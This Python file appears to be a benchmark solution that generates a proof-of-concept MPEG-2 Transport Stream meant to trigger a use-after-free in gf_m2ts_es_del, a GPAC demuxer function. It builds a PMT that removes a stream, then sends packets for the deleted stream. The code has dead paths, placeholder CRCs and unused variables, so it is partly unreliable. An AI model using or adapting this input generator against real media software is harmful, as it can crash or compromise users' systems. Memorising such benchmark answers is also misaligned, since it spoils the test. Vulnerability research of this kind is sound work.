import os
import tempfile
import tarfile
import subprocess
import struct
import random

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Look for source files to understand structure
            src_root = self._find_source_root(tmpdir)
            
            # Based on common MPEG-2 Transport Stream structures,
            # create a TS file that could trigger use-after-free in gf_m2ts_es_del
            return self._generate_ts_poc()
    
    def _find_source_root(self, tmpdir):
        # Try to find the main source directory
        for root, dirs, files in os.walk(tmpdir):
            if 'src' in dirs:
                return os.path.join(root, 'src')
        return tmpdir
    
    def _generate_ts_poc(self) -> bytes:
        # Create a minimal MPEG-2 Transport Stream that could trigger
        # use-after-free in gf_m2ts_es_del function
        
        # Start with TS packets structure
        poc = bytearray()
        
        # Generate packets that might cause issues with elementary stream handling
        # Strategy: Create multiple ES streams and rapidly delete them
        
        # Add some initial packets
        for i in range(5):
            poc.extend(self._create_ts_packet(pid=0, payload=self._create_pat()))
        
        # Create multiple elementary streams
        for pid in [0x100, 0x101, 0x102, 0x103]:
            poc.extend(self._create_ts_packet(pid=0x10, payload=self._create_pmt(pid)))
            
            # Add some PES packets for each stream
            for j in range(3):
                poc.extend(self._create_ts_packet(
                    pid=pid, 
                    payload=self._create_pes_header(stream_id=0xE0, pts=90000*j)
                ))
                
                # Add payload data that could trigger issues
                poc.extend(self._create_ts_packet(
                    pid=pid,
                    payload=b'\x00' * random.randint(10, 50)
                ))
        
        # Add packets that might trigger rapid creation/deletion of ES
        # This is where use-after-free might occur
        for i in range(10):
            # Rapidly switch between streams
            pid = random.choice([0x100, 0x101, 0x102, 0x103])
            poc.extend(self._create_ts_packet(
                pid=pid,
                payload=self._create_pes_header(stream_id=0xE0, pts=90000*(i+10))
            ))
            
            # Add null adaptation fields which might trigger issues
            poc.extend(self._create_ts_packet_with_adaptation(
                pid=pid,
                adaptation_length=0,
                payload=b''
            ))
        
        # Add packets that might cause ES deletion
        # Remove streams from PMT
        poc.extend(self._create_ts_packet(pid=0x10, payload=self._create_empty_pmt()))
        
        # But continue sending packets for deleted streams (use-after-free trigger)
        for i in range(5):
            poc.extend(self._create_ts_packet(
                pid=0x100 + (i % 4),
                payload=self._create_pes_header(stream_id=0xE0, pts=90000*(i+20))
            ))
        
        # Add some adaptation field packets which might trigger specific code paths
        for i in range(3):
            poc.extend(self._create_ts_packet_with_adaptation(
                pid=0x100,
                adaptation_length=7,
                payload=b''
            ))
        
        # Ensure exact length (1128 bytes as per ground truth)
        # Each TS packet is 188 bytes
        # 1128 / 188 = 6 packets exactly
        # Let's create exactly 6 carefully crafted packets
        
        final_poc = bytearray()
        
        # Packet 1: PAT with valid structure
        final_poc.extend(self._create_ts_packet(pid=0, payload=self._create_pat()))
        
        # Packet 2: PMT with one stream
        final_poc.extend(self._create_ts_packet(
            pid=0x10,
            payload=self._create_pmt(0x100)
        ))
        
        # Packet 3: PES header for the stream
        final_poc.extend(self._create_ts_packet(
            pid=0x100,
            payload=self._create_pes_header(stream_id=0xE0, pts=0)
        ))
        
        # Packet 4: Empty adaptation field (could trigger issues)
        final_poc.extend(self._create_ts_packet_with_adaptation(
            pid=0x100,
            adaptation_length=0,
            payload=b''
        ))
        
        # Packet 5: New PMT removing the stream
        final_poc.extend(self._create_ts_packet(
            pid=0x10,
            payload=self._create_empty_pmt()
        ))
        
        # Packet 6: Another packet for the now-deleted stream (use-after-free)
        final_poc.extend(self._create_ts_packet(
            pid=0x100,
            payload=self._create_pes_header(stream_id=0xE0, pts=90000)
        ))
        
        # Verify length
        if len(final_poc) != 1128:
            # Adjust by adding/removing filler
            needed = 1128 - len(final_poc)
            if needed > 0:
                final_poc.extend(b'\xFF' * needed)
            else:
                final_poc = final_poc[:1128]
        
        return bytes(final_poc)
    
    def _create_ts_packet(self, pid: int, payload: bytes) -> bytes:
        """Create a TS packet with given PID and payload."""
        packet = bytearray(188)
        
        # Sync byte
        packet[0] = 0x47
        
        # PID (13 bits)
        packet[1] = (pid >> 8) & 0x1F
        packet[2] = pid & 0xFF
        
        # Adaptation field control (payload only) and continuity counter
        packet[3] = 0x10  # payload only, no adaptation field
        packet[3] |= 0x01  # continuity counter
        
        # Copy payload
        if payload:
            packet[4:4+len(payload)] = payload
            
        return packet
    
    def _create_ts_packet_with_adaptation(self, pid: int, adaptation_length: int, payload: bytes) -> bytes:
        """Create a TS packet with adaptation field."""
        packet = bytearray(188)
        
        # Sync byte
        packet[0] = 0x47
        
        # PID
        packet[1] = (pid >> 8) & 0x1F
        packet[2] = pid & 0xFF
        
        # Adaptation field control (with adaptation field)
        packet[3] = 0x30  # adaptation field followed by payload
        packet[3] |= 0x01  # continuity counter
        
        # Adaptation field length
        packet[4] = adaptation_length
        
        # If adaptation field has content
        if adaptation_length > 0:
            # Discontinuity indicator, random access indicator, etc.
            packet[5] = 0x00  # flags
            
            # Fill rest of adaptation field with zeros if needed
            for i in range(6, 4 + adaptation_length + 1):
                packet[i] = 0x00
        
        # Copy payload after adaptation field
        payload_start = 4 + adaptation_length + 1
        if payload and payload_start < 188:
            packet[payload_start:payload_start+len(payload)] = payload
            
        return packet
    
    def _create_pat(self) -> bytes:
        """Create Program Association Table."""
        pat = bytearray()
        
        # Table ID
        pat.append(0x00)
        
        # Section length (13 bits)
        pat.append(0xB0)  # top 2 bits reserved as '11', length=0x0D
        pat.append(0x0D)
        
        # Transport stream ID
        pat.extend([0x00, 0x01])
        
        # Version and current_next_indicator
        pat.append(0xC1)
        
        # Section number and last section number
        pat.extend([0x00, 0x00])
        
        # Program 0 -> Network PID
        pat.extend([0x00, 0x00])
        pat.extend([0xE0, 0x10])  # PMT PID = 0x10
        
        # CRC placeholder
        pat.extend([0x00, 0x00, 0x00, 0x00])
        
        return pat
    
    def _create_pmt(self, video_pid: int) -> bytes:
        """Create Program Map Table with one video stream."""
        pmt = bytearray()
        
        # Table ID
        pmt.append(0x02)
        
        # Section length (will calculate)
        pmt.append(0xB0)
        pmt.append(0x00)  # placeholder
        
        # Program number
        pmt.extend([0x00, 0x01])
        
        # Version and current_next_indicator
        pmt.append(0xC1)
        
        # Section number and last section number
        pmt.extend([0x00, 0x00])
        
        # PCR PID (same as video PID)
        pmt.extend([(video_pid >> 8) & 0x1F, video_pid & 0xFF])
        
        # Program info length
        pmt.extend([0xF0, 0x00])  # no program descriptors
        
        # Video stream type (MPEG-2 video)
        pmt.append(0x02)
        
        # Video PID
        pmt.extend([(video_pid >> 8) & 0x1F | 0xE0, video_pid & 0xFF])
        
        # ES info length
        pmt.extend([0xF0, 0x00])  # no ES descriptors
        
        # Update section length
        section_length = len(pmt) - 3 + 4  # -3 for initial bytes, +4 for CRC
        pmt[1] = 0xB0 | ((section_length >> 8) & 0x0F)
        pmt[2] = section_length & 0xFF
        
        # CRC placeholder
        pmt.extend([0x00, 0x00, 0x00, 0x00])
        
        return pmt
    
    def _create_empty_pmt(self) -> bytes:
        """Create empty PMT (no streams)."""
        pmt = bytearray()
        
        # Table ID
        pmt.append(0x02)
        
        # Section length
        pmt.append(0xB0)
        pmt.append(0x0F)  # length = 15
        
        # Program number
        pmt.extend([0x00, 0x01])
        
        # Version and current_next_indicator
        pmt.append(0xC1)
        
        # Section number and last section number
        pmt.extend([0x00, 0x00])
        
        # PCR PID (none)
        pmt.extend([0xE0, 0x00])
        
        # Program info length
        pmt.extend([0xF0, 0x00])
        
        # CRC placeholder
        pmt.extend([0x00, 0x00, 0x00, 0x00])
        
        return pmt
    
    def _create_pes_header(self, stream_id: int, pts: int) -> bytes:
        """Create PES packet header."""
        pes = bytearray()
        
        # Start code prefix
        pes.extend([0x00, 0x00, 0x01])
        
        # Stream ID
        pes.append(stream_id)
        
        # PES packet length (0 means variable/unbounded)
        pes.extend([0x00, 0x00])
        
        # Flags: PTS present
        pes.extend([0x80, 0x00])
        
        # PES header data length
        pes.append(5)  # PTS takes 5 bytes
        
        # PTS (33 bits + marker bits)
        pts_high = (pts >> 29) & 0x0E | 0x21  # marker bits '0010' in first 4 bits
        pts_mid = (pts >> 22) & 0xFF
        pts_low_mid = (pts >> 14) & 0xFE | 0x01  # marker bit
        pts_low = (pts >> 7) & 0xFF
        pts_lowest = (pts & 0x7F) << 1 | 0x01  # marker bit
        
        pes.extend([pts_high, pts_mid, pts_low_mid, pts_low, pts_lowest])
        
        return pes
